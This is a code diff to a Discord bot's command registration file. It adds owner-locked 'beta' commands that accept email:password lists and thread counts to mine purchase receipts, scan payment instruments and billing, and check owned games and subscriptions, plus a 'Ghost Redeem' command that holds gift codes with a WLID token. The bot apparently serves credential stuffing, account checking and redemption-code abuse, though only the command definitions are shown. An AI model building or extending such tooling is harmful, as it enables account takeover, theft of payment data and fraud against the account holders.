@@ -115,6 +115,40 @@ const commands = [
     .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
     .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
     .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-50, default 30)").setMinValue(1).setMaxValue(50)),
+
+  // ── Beta Functions (Owner-locked) ──
+  new SlashCommandBuilder()
+    .setName("beta-price")
+    .setDescription("[BETA] Regional Price Sniper — compare prices across 30 markets")
+    .addStringOption((o) => o.setName("product").setDescription("Product ID or search query").setRequired(true)),
+
+  new SlashCommandBuilder()
+    .setName("beta-ghost")
+    .setDescription("[BETA] Ghost Redeem — hold codes via PrepareRedeem without completing")
+    .addStringOption((o) => o.setName("wlid").setDescription("WLID token for auth").setRequired(false))
+    .addAttachmentOption((o) => o.setName("codes_file").setDescription("Text file with codes").setRequired(false))
+    .addStringOption((o) => o.setName("codes").setDescription("Codes (comma-separated)").setRequired(false)),
+
+  new SlashCommandBuilder()
+    .setName("beta-receipt")
+    .setDescription("[BETA] Receipt Miner — extract purchase history from accounts")
+    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password").setRequired(false))
+    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
+    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-30, default 10)").setMinValue(1).setMaxValue(30)),
+
+  new SlashCommandBuilder()
+    .setName("beta-payment")
+    .setDescription("[BETA] Payment Arsenal — deep payment instrument & billing scan")
+    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password").setRequired(false))
+    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
+    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-30, default 10)").setMinValue(1).setMaxValue(30)),
+
+  new SlashCommandBuilder()
+    .setName("beta-entitle")
+    .setDescription("[BETA] Entitlement Scanner — check owned games/subscriptions/content")
+    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password").setRequired(false))
+    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
+    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-30, default 10)").setMinValue(1).setMaxValue(30)),
 ].map((c) => c.toJSON());
 
 const rest = new REST({ version: "10" }).setToken(BOT_TOKEN);
